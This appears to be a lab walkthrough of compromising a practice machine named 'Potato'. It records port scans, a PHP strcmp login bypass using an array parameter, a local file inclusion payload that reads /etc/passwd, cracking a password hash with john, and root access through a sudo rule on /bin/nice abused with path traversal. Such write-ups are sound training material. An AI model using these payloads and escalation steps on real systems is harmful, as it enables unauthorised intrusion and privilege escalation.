## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.115.101
# HOSTNAME // Found Post Initial foothold
serv
# OPERATING SYSTEM // Found Post Initial foothold
VERSION="20.04 LTS (Focal Fossa)"
# CREDENTIALS   // Found Post Initial foothold
webadmin:dragon
```
## OPEN PORTS DETAILS
```bash
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
2112/tcp open  ftp     syn-ack ttl 61 ProFTPD
```
# ENUMERATION
## PORT 80
```bash
# Recon
Server: Apache/2.4.41 (Ubuntu)
# Tool used
sudo curl -I $url

# Fuzzing 
301      GET        9l       28w      318c http://192.168.115.101/admin => http://192.168.115.101/admin/
200      GET       21l      116w     9564c http://192.168.115.101/potato.jpg
200      GET        8l       32w      245c http://192.168.115.101/
301      GET        9l       28w      323c http://192.168.115.101/admin/logs => http://192.168.115.101/admin/logs/
200      GET        4l       14w       86c http://192.168.115.101/admin/logs/log_01.txt
200      GET        4l       14w      597c http://192.168.115.101/admin/logs/log_03.txt
200      GET        4l       15w       88c http://192.168.115.101/admin/logs/log_02.txt
301      GET        9l       28w      319c http://192.168.115.101/potato => http://192.168.115.101/potato/
# Tool used
sudo feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 403,404 -o fuzz/feroxbuster-directory-list-2.3-medium.txt -t 20 -u $url/

# Review code and Google Fu (php strcmp bypass) found
# Vulnerability Reference Links
- https://blog.0daylabs.com/2015/09/21/csaw-web-200-write-up/
- https://rst.hashnode.dev/bypassing-php-strcmp
- https://www.youtube.com/watch?v=athpsjvgkWM
# Poc 
password[]=%22%22 

# Intercept via burpsuite
- POST Request
username=admin&password[]=

- Found 
http://192.168.115.101/admin/dashboard.php
<a href="dashboard.php"> Home </a>&emsp;
<a href="dashboard.php?page=users">Users </a>&emsp;
<a href="dashboard.php?page=date"> Date </a>&emsp;
<a href="dashboard.php?page=log"> Logs </a>&emsp;
<a href="dashboard.php?page=ping"> Ping </a>

# Intercepting request - Found including file log_01.txt on file parameter
/admin/dashboard.php?page=log
file=log_01.txt

# Checking for LFI
/admin/dashboard.php?page=log
file=../../../../../etc/passwd

- Worked LFI
- Found
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```
## PORT 2112
```bash
- Seems like ftp
- Anonymous FTP login allowed

ftp> ls
229 Entering Extended Passive Mode (|||28790|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg

# FIle contents - index.php.bak
-----------------------------------------------------------------------------------------------------
<html>
<head></head>
<body>
<?php
$pass= "potato"; //note Change this password regularly
if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>
  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
-----------------------------------------------------------------------------------------------------
```
## INITIAL FOOTHOLD
```bash
# Decoding the hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash 
dragon           (webadmin)     

# Creds
webadmin:dragon

# Login via ssh for webadmin shell
sudo ssh webadmin@$ip
dragon
```
## PRIVILEGE ESCALATION
```bash
webadmin@serv:~$ sudo -l
[sudo] password for webadmin: 
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
webadmin@serv:~$ sudo /bin/nice /notes/../../../bin/bash
root@serv:/home/webadmin# id
uid=0(root) gid=0(root) groups=0(root)
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Wed Feb  5 13:00:21 2025 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.115.101
Nmap scan report for 192.168.115.101
Host is up, received echo-reply ttl 61 (0.037s latency).
Scanned at 2025-02-05 13:00:23 IST for 35s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDamdAqH2ZyWoYj0tstPK0vbVKI+9OCgtkGDoynffxqV2kE4ceZn77FBuMGFKLU50Uv5RMUTFTX4hm1ijh77KMGG1CmAk2YWvEDhxbCBPCohp+xXMBXHBYoMbEVl/loKL2UW6USnKorOgwxUdoMAwDxIrohGHQ5WNUADRaqt1eHuHxuJ8Bgi8yzqP/26ePQTLCfwAZMq+SYPJedZBmfJJ3Brhb/CGgzgRU8BpJGI8IfBL5791JTn2niEgoMAZ1vdfnSx0m49uk8npd0h5hPQ+ucyMh+Q35lJ1zDq94E24mkgawDhEgmLtb23JDNdY4rv/7mAAHYA5AsRSDDFgmbXEVcC7N1c3cyrwVH/w+zF5SKOqQ8hOF7LRCqv0YQZ05wyiBu2OzbeAvhhiKJteICMuitQAuF6zU/dwjX7oEAxbZ2GsQ66kU3/JnL4clTDATbT01REKJzH9nHpO5sZdebfLJdVfx38qDrlS+risx1QngpnRvWTmJ7XBXt8UrfXGenR3U=
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNoh1z4mRbfROqXjtv9CG7ZYGiwN29OQQCVXMLce4ejLzy+0Bvo7tYSb5PKVqgO5jd1JaB3LLGWreXo6ZY3Z8T8=
|   256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDXv++bn0YEgaoSEmMm3RzCzm6pyUJJSsSW9FMBqvZQ3
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Potato company
2112/tcp open  ftp     syn-ack ttl 61 ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  5 13:00:58 2025 -- 1 IP address (1 host up) scanned in 37.46 seconds
```

